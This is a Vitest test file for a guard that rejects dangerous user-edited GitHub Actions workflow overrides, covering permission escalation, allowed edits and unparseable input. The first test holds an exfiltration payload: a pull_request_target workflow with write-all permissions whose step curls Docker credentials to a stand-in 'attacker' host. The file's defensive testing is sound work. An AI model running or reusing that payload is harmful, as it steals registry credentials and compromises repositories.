import { describe, it, expect } from 'vitest';
import { checkWorkflowOverride } from './workflow-guard.js';
import { renderWorkflow } from './workflow.js';

/**
 * The override is committed verbatim, so this guard is the only thing standing between a
 * user-edited workflow and the target repository. The first case below is the exact
 * payload a security review used to demonstrate the hole.
 */
describe('checkWorkflowOverride', () => {
  it('rejects the review’s exfiltration payload — pull_request_target + write-all', () => {
    const malicious = [
      'on:',
      '  pull_request_target:',
      '    types: [opened]',
      'permissions: write-all',
      'jobs:',
      '  x:',
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - uses: actions/checkout@v4',
      "        with: {ref: '${{ github.event.pull_request.head.sha }}'}",
      '      - run: curl -d @$HOME/.docker/config.json https://attacker/',
    ].join('\n');

    const codes = checkWorkflowOverride(malicious).map((p) => p.code);
    expect(codes).toContain('pull_request_target');
    expect(codes).toContain('permission_escalation');
  });

  it('lets the workflow we generate ourselves through unchanged', () => {
    // The guard must never reject our own output, or editing anything at all becomes
    // impossible — the check would be a disguised removal of the feature.
    const generated = renderWorkflow({
      triggers: ['opened', 'synchronize', 'reopened'],
      postAs: 'github_review',
    });
    expect(checkWorkflowOverride(generated)).toEqual([]);
  });

  it('allows ordinary edits — a different runner, a pinned Node version, an extra step', () => {
    const edited = [
      'name: DevDigest CI Review',
      'on:',
      '  pull_request:',
      '    types: [opened]',
      'permissions:',
      '  contents: read',
      '  pull-requests: write',
      'jobs:',
      '  review:',
      '    runs-on: ubuntu-22.04',
      '    steps:',
      '      - uses: actions/checkout@v4',
      '      - uses: actions/setup-node@v4',
      '        with:',
      '          node-version: "22"',
      '      - run: echo "house rule"',
      '      - run: node .devdigest/runner/index.js',
    ].join('\n');
    expect(checkWorkflowOverride(edited)).toEqual([]);
  });

  it('rejects a write scope we never grant, even when the rest looks normal', () => {
    const sneaky = [
      'on: { pull_request: { types: [opened] } }',
      'permissions:',
      '  contents: write', // we grant read
      '  pull-requests: write',
      'jobs: { review: { runs-on: ubuntu-latest, steps: [] } }',
    ].join('\n');
    const problems = checkWorkflowOverride(sneaky);
    expect(problems.map((p) => p.code)).toEqual(['permission_escalation']);
    expect(problems[0]!.detail).toContain('contents');
  });

  it('catches an escalation hidden in a JOB-level permissions block', () => {
    // Top-level permissions look innocent; the job quietly widens them.
    const jobLevel = [
      'on: { pull_request: { types: [opened] } }',
      'permissions:',
      '  contents: read',
      'jobs:',
      '  review:',
      '    runs-on: ubuntu-latest',
      '    permissions:',
      '      id-token: write',
      '    steps: []',
    ].join('\n');
    expect(checkWorkflowOverride(jobLevel).map((p) => p.code)).toEqual(['permission_escalation']);
  });

  it('weaker-than-default permissions are fine', () => {
    const weaker = [
      'on: { pull_request: { types: [opened] } }',
      'permissions:',
      '  contents: none',
      '  pull-requests: read',
      'jobs: { review: { runs-on: ubuntu-latest, steps: [] } }',
    ].join('\n');
    expect(checkWorkflowOverride(weaker)).toEqual([]);
  });

  it('fails CLOSED on text it cannot parse', () => {
    // A check that cannot read the document cannot vouch for it.
    expect(checkWorkflowOverride('on: [\n  unclosed').map((p) => p.code)).toEqual(['unparseable']);
    expect(checkWorkflowOverride('just a string').map((p) => p.code)).toEqual(['unparseable']);
  });
});
